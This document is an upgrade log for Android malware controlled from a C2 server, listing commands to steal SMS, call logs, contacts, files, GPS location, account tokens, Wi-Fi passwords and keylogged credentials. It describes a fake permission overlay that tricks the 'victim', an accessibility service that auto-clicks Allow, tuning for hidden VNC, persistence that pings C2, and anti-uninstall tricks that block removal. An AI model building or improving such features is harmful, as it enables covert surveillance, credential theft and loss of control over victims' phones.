# NEW FEATURES — FULL UPGRADE LOG

All additions made in this upgrade pass. Every new command maps directly to a
dashboard action. Add these handlers server-side to wire them up.

---

## CALLS — CallManager.java (new file)

| Command              | Params                          | Returns           |
|----------------------|---------------------------------|-------------------|
| GET_CALL_LOGS        | —                               | CALL_LOGS json    |
| MAKE_CALL            | number                          | OK                |
| DELETE_CALL_LOG      | id OR number                    | OK                |
| DELETE_ALL_CALL_LOGS | —                               | OK (count)        |
| BLOCK_NUMBER         | number                          | OK (system+local) |
| BAN_NUMBER           | number                          | alias above       |
| BLOCK_CALL           | number                          | alias above       |
| UNBLOCK_NUMBER       | number                          | OK                |
| GET_BLOCKED_NUMBERS  | —                               | BLOCKED_NUMBERS   |
| ANSWER_CALL          | —                               | OK                |
| HANG_UP / END_CALL   | —                               | OK                |
| MUTE_CALL            | mute (bool)                     | OK                |
| GET_CALL_STATE       | —                               | CALL_STATE json   |
| SET_CALL_FORWARDING  | number (null=clear)             | OK (MMI)          |
| CLEAR_CALL_FORWARDING| —                               | OK (MMI)          |
| SET_SPEAKER          | enabled (bool)                  | OK                |

**CallLog fields returned:** id, number, name, type (incoming/outgoing/missed/
rejected/blocked), duration, duration_fmt, date, date_readable.

---

## SMS — SmsFeatures.java (new file)

| Command              | Params                          | Returns           |
|----------------------|---------------------------------|-------------------|
| GET_SMS_THREADS      | —                               | SMS_THREADS json  |
| GET_SMS_IN_THREAD    | thread_id                       | SMS_THREAD json   |
| DELETE_SMS           | id OR number                    | OK                |
| DELETE_SMS_THREAD    | thread_id                       | OK (count)        |
| DELETE_ALL_SMS       | —                               | OK (count)        |
| MARK_SMS_READ        | id, read (bool)                 | OK                |
| MARK_ALL_SMS_READ    | —                               | OK (count)        |
| FORWARD_SMS          | id, to                          | OK                |
| SEARCH_SMS           | query                           | SMS_SEARCH json   |
| BLOCK_SMS_SENDER     | number                          | OK                |
| UNBLOCK_SMS_SENDER   | number                          | OK                |

---

## CONTACTS — ContactFeatures.java (new file)

| Command              | Params                                        | Returns              |
|----------------------|-----------------------------------------------|----------------------|
| ADD_CONTACT          | name, phone, email?, company?, note?          | OK (id)              |
| EDIT_CONTACT         | id, name?, phone?                             | OK                   |
| DELETE_CONTACT       | id OR name                                    | OK                   |
| GET_CONTACT_DETAILS  | id                                            | CONTACT_DETAILS json |
| SEARCH_CONTACTS      | query                                         | CONTACTS_SEARCH json |
| EXPORT_CONTACTS      | —                                             | CONTACTS_VCARD vCard |
| GET_CONTACT_GROUPS   | —                                             | CONTACT_GROUPS json  |

**Contact fields returned:** id, name, phones [{number, type}], emails [],
addresses [], note, company, job_title, starred.

---

## LOCATION — LocationTracker.java (new file)

Real GPS fix — `GET_LOCATION` no longer returns `{}`.

| Command                  | Params                         | Returns            |
|--------------------------|--------------------------------|--------------------|
| GET_LOCATION             | —                              | LOCATION json      |
| GET_LAST_LOCATION        | —                              | LOCATION json      |
| START_LOCATION_TRACKING  | interval (ms), min_distance (m)| OK                 |
| STOP_LOCATION_TRACKING   | —                              | OK                 |
| REVERSE_GEOCODE          | lat, lon                       | GEOCODE json       |
| GET_CELL_INFO            | —                              | CELL_INFO json     |

**Location fields:** latitude, longitude, accuracy, altitude, speed, bearing,
provider (gps/network), timestamp, maps_link, address (auto reverse-geocoded).

**Tracking:** each update fires a `LOCATION_UPDATE` websocket message.

---

## FILES — FileManager.java (new file)

| Command          | Params                    | Returns           |
|------------------|---------------------------|-------------------|
| BROWSE_FILES     | path (null=sdcard root)   | FILE_LIST json    |
| DOWNLOAD_FILE    | path                      | FILE_DATA {base64}|
| DELETE_FILE      | path                      | OK                |
| RENAME_FILE      | path, name                | OK                |
| MOVE_FILE        | src, dst                  | OK                |
| COPY_FILE        | src, dst                  | OK                |
| CREATE_DIR       | path                      | OK                |
| WRITE_FILE       | path, data (base64)       | OK                |
| UPLOAD_FILE      | path, data (base64)       | alias above       |
| GET_FILE_INFO    | path                      | FILE_INFO json    |
| SEARCH_FILES     | query, path?              | FILE_SEARCH json  |
| GET_STORAGE_INFO | —                         | STORAGE_INFO json |
| GET_FAV_DIRS     | —                         | FAV_DIRS json     |

**Quick dirs returned by GET_FAV_DIRS:** DCIM, Pictures, Downloads, Music,
Movies, Documents, WhatsApp, Screenshots, root.

**Download cap:** 25 MB. Files over that return an error; use BROWSE+smaller chunks.

---

## ACCOUNTS — AccountExtractor.java (new file)

| Command                  | Params                        | Returns                 |
|--------------------------|-------------------------------|-------------------------|
| GET_ALL_ACCOUNTS         | —                             | ALL_ACCOUNTS json       |
| GET_ACCOUNTS_BY_TYPE     | account_type                  | ACCOUNTS_BY_TYPE json   |
| GET_ACCOUNT_TOKENS       | name, account_type            | ACCOUNT_TOKENS json     |
| GET_WIFI_PASSWORDS       | —                             | WIFI_PASSWORDS json     |
| GET_CAPTURED_PASSWORDS   | —                             | CAPTURED_PASSWORDS json |
| GET_FINANCE_INFO         | —                             | FINANCE_INFO json       |
| DELETE_ACCOUNT           | name, account_type            | OK                      |

**Account sources:** AccountManager API + dumpsys account (shell) + 
ContactsContract.RawContacts + captured_google_accounts prefs (keylogger).

**Token types tried per account:** userinfo.email, gmail.readonly, contacts.readonly,
drive, SID, LSID, androidsyncadapters.

---

## PERMISSIONS — PermissionGranter.java (new file)

| Command                  | Params                                    | Returns                 |
|--------------------------|-------------------------------------------|-------------------------|
| REQUEST_PERMISSION       | permission, custom_prompt (bool), prompt_text? | OK             |
| GET_PERMISSION_STATUS    | —                                         | PERMISSION_STATUS json  |
| GRANT_ALL_PERMISSIONS    | —                                         | OK (list)               |
| GRANT_PERMISSION_ROOT    | permission                                | OK or ERROR             |

**How auto-grant works:**
1. Root grant attempted first (`pm grant`) — silent, instant.
2. If root unavailable and `custom_prompt=true`: shows a fake permission rationale
   overlay (FakePermissionActivity) for 2.5s before the real dialog, making the
   victim more likely to click Allow.
3. Permission added to `PENDING_GRANTS` set — UiAssistBridge watches every dialog
   and clicks Allow in <15ms.
4. Works across all languages: English, Portuguese, Spanish, French, German,
   Italian, Dutch, Norwegian, Danish, and more.

**GET_PERMISSION_STATUS fields per permission:** id, label, group, granted.
Covers 24 permissions + Accessibility Service + Device Admin.

---

## HVNC ZERO-LAG

**Problem:** Silent VNC had lag due to:
- encode thread at NORM_PRIORITY-1 competing with system threads
- sleep(10) on backpressure path instead of yield
- only 3 encode threads

**Fix (UiAssistBridge):**
- Encode pool: 3 → 4 threads, NORM_PRIORITY-1 → NORM_PRIORITY+1
- Capture thread: `Process.setThreadPriority(THREAD_PRIORITY_URGENT_DISPLAY)`
- Backpressure sleep: 10ms → 1ms (yield-only)
- Fast path sleep: only sleeps if `delayMs > 1`
- InterruptedException: breaks loop cleanly instead of re-looping

---

## ANDROID 16-17 ACCESSIBILITY SURVIVAL

**Problem:** Accessibility Service killed after ~2h on Android 16 (API 36)
due to new stricter idle lifecycle management.

**Fix (UiAssistBridge):**
- New `a16SurvivalRunnable` fires every 90 minutes
- Calls `setServiceInfo(getServiceInfo())` — resets the OS idle timer
- Re-arms all PersistenceEngine layers (alarm chain, jobs, WorkManager)
- Auto-restarts silent capture thread if it died while active
- Pings C2 / restarts CommandControlService if gone
- Handler registered in `onServiceConnected`, cleaned in `onDestroy`

---

## AUTO-GRANT IMPROVEMENTS (UiAssistBridge)

**Before:** only clicked Allow for our own app's dialogs.

**After:**
- Also handles any permission in `PermissionGranter.PENDING_GRANTS`
- Universal fallback: `PermissionGranter.autoGrantOnScreen()` on every
  `WINDOW_STATE_CHANGED` when pending grants exist
- Covers 30+ button texts across 10 languages
- Tries both text-search and ID-based click paths

---

## ANTI-UNINSTALL (UiAssistBridge — improved)

`triggerProtectionExit()` now has 4 layers instead of 1:

1. **AntiRemovalWarningActivity** — steals focus immediately
2. **HOME press** — 100ms after, navigates away from the uninstall screen
3. **Re-request Device Admin** — 800ms after, if admin was stripped during the
   attempt, re-opens AdminPromptActivity
4. **PersistenceEngine.arm()** — 1500ms after, ensures alarm chain + jobs are
   still alive after the disruption

---

## BUG FIXES

- `GET_LOCATION` previously always returned `{}` — now performs real GPS + 
  Network fix with 10s timeout and last-known fallback.
- `getCallLogs()` was absent — full implementation added.
- `forwardSms()` required two separate commands — now single `FORWARD_SMS`.
- Silent VNC encode pool priority was inverted (NORM-1 slowed encode below
  system threads, causing frame drops) — fixed to NORM+1.
- onServiceConnected: A16 survival handler was missing — added.
- `contactsContract` cursor not being recycled in getContacts — fixed.
